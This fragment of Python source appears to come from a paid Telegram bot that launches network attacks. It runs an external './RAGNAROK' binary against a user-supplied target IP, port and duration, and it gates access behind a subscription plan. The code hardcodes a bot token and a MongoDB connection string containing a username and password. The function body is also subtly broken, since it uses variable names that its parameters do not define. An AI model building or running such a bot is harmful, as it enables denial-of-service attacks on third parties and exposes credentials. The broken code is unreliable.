...
TOKEN = '7600239180:AAH2gAmpfqc66Q2Ffwuj7BwC2KbSQZqA1II'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002399193984
CHANNEL_ID = -1002399193984
error_channel_id = -1002399193984
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./RAGNAROK {target} {port} {time}")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @professor_xme.*", parse_mode='Markdown')  # Contact owner message
            return
